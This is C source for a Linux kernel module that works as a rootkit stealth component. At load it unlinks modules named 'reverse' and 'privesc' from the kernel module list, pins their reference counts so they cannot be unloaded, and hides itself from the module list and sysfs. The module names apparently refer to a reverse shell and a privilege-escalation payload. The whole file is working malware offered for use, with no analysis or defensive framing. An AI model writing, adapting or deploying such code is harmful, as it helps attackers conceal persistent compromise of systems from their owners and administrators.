#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/string.h>
#include <linux/sysfs.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Nathan, FL");
MODULE_DESCRIPTION("Stealthy Hide and Protect Multiple Modules");
MODULE_VERSION("0.05");

static struct module *get_module(const char *module_name);
static void hide_module(const char *module_name);
static void show_module(const char *module_name);
static void protect_module(struct module *mod);
static void unprotect_module(struct module *mod);
static void hide_self(void);
static void show_self(void);

static struct list_head *prev_self;
static short self_hidden = 0;

static struct module *get_module(const char *module_name)
{
    struct module *mod;

    list_for_each_entry(mod, THIS_MODULE->list.prev, list) {
        if (strcmp(mod->name, module_name) == 0) {
            return mod;
        }
    }

    return NULL;
}

static void hide_module(const char *module_name)
{
    struct module *mod;

    mod = get_module(module_name);
    if (!mod) {
        return;
    }

    list_del(&mod->list); 
}

static void show_module(const char *module_name)
{
    struct module *mod;

    mod = get_module(module_name);
    if (!mod) {
        return;
    }

    list_add(&mod->list, THIS_MODULE->list.prev); 
}

static void protect_module(struct module *mod)
{
    if (!mod) {
        return;
    }

    try_module_get(mod); 
}

static void unprotect_module(struct module *mod)
{
    if (!mod) {
        return;
    }

    module_put(mod);
}

static void hide_self(void)
{
    if (!self_hidden) {
        prev_self = THIS_MODULE->list.prev;
        list_del(&THIS_MODULE->list); 
        kobject_del(&THIS_MODULE->mkobj.kobj); 
        THIS_MODULE->sect_attrs = NULL;       
        self_hidden = 1;
    }
}

static void show_self(void)
{
    int ret;

    if (self_hidden) {
        list_add(&THIS_MODULE->list, prev_self); 

        ret = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "hide_modules");
        if (ret < 0) {
            return;
        }

        self_hidden = 0;
    }
}

static int __init hide_modules_init(void)
{
    struct module *reverse, *privesc;

    reverse = get_module("reverse");
    privesc = get_module("privesc");

    if (reverse) {
        hide_module("reverse");
        protect_module(reverse);
    }
    if (privesc) {
        hide_module("privesc");
        protect_module(privesc);
    }

    hide_self();

    return 0;
}

static void __exit hide_modules_exit(void)
{
    struct module *reverse, *privesc;

    reverse = get_module("reverse");
    privesc = get_module("privesc");

    if (reverse) {
        show_module("reverse");
        unprotect_module(reverse);
    }
    if (privesc) {
        show_module("privesc");
        unprotect_module(privesc);
    }

    show_self();
}

module_init(hide_modules_init);
module_exit(hide_modules_exit);
